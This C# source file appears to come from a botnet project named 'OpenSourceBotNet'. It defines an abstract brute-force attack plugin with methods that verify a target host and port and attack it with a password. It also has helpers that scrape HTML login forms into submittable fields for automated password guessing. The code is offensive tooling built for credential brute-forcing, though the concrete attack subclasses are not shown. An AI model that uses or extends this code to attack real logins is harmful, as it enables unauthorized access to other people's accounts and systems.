using System;
using System.Collections;

using System.Text;

using OpenSourceBotNet.Plugins.Engines;

namespace OpenSourceBotNet.Plugins.Engines.Plugins
{
    public abstract class BruteForceEnginePlugin : FluxEnginePlugin
    {
        public abstract string VerifyTarget(string sPluginTargetHost, int iPluginTargetPort);
        public abstract object[] Attack(string sPluginTargetHost, int iPluginTargetPort, string sPluginTargetVersion, string Password);

        public string[] extractInputs(string html)
        {
            ArrayList alInputs = new ArrayList();

            string[] htmlForms = html.Replace("!", "ADKEKDA").Replace("<for", "!").Replace("<FOR", "!").Replace("<For", "!").Split('!');
            string targetForm = "";
            foreach (string htmlForm in htmlForms)
            {
                if (htmlForm.ToLower().StartsWith("m"))
                {
                    string formHeader = htmlForm.Replace(">", "!").Split('!')[0];

                    string formName = getHtmlElementAttribute(formHeader, "name");

                    //if (formName == formTargetName)
                    //{
                    targetForm = htmlForm;
                    break;
                    //}
                }
            }

            string[] htmlInputs = targetForm.Replace("!", "ADKEKDA").Replace("<Inpu", "!").Replace("<INPU", "!").Replace("<inpu", "!").Split('!');
            foreach (string htmlInput in htmlInputs)
            {
                if (htmlInput.ToLower().StartsWith("t"))
                {
                    string input = htmlInput.Replace("/>", "!").Replace("</input>", "!").Split('!')[0];

                    string inputName = getHtmlElementAttribute(input, "name");

                    if (inputName == "")
                    {
                        continue;
                    }

                    if (input.Contains("value"))
                    {
                        string inputNameValue = getHtmlElementAttribute(input, "value");

                        if (inputNameValue == "")
                        {
                            inputNameValue = " ";
                        }

                        alInputs.Add(inputName + "=" + System.Uri.EscapeDataString(inputNameValue));
                    }
                    else
                    {
                        alInputs.Add(inputName + "= ");
                    }
                }
            }

            // string[] htmlTextarea = targetForm.Replace("!", "ADKEKDA").Replace("<textar", "!").Split('!');

            // string[] htmlSelect = targetForm.Replace("!", "ADKEKDA").Replace("<select", "!").Split('!');

            string[] spReturnable = new string[alInputs.Count];

            for (int i = 0; i < alInputs.Count; i++)
            {
                spReturnable[i] = alInputs[i].ToString();
            }

            return spReturnable;
        }

        public string getHtmlElementAttribute(string element, string attribute)
        {
            if (element.Contains(attribute))
            {
                string value = element.Replace(attribute + "=", "!").Split('!')[1];

                string inputNameValue = "";

                bool bFlagOn = false;

                foreach (char valueChar in value.ToCharArray())
                {
                    if (bFlagOn == true) //  && valueChar != '>' && valueChar != ' ')
                    {
                        inputNameValue += valueChar;
                    }

                    if ((valueChar == '"' || valueChar == '\'') && bFlagOn == false)
                    {
                        bFlagOn = true;
                    }
                    else if ((valueChar == '"' || valueChar == '\'') && bFlagOn == true)
                    {
                        inputNameValue = inputNameValue.Substring(0, inputNameValue.Length - 1);
                        break;
                    }
                }

                return inputNameValue;
            }
            else
            {
                return "";
            }
        }
    }
}
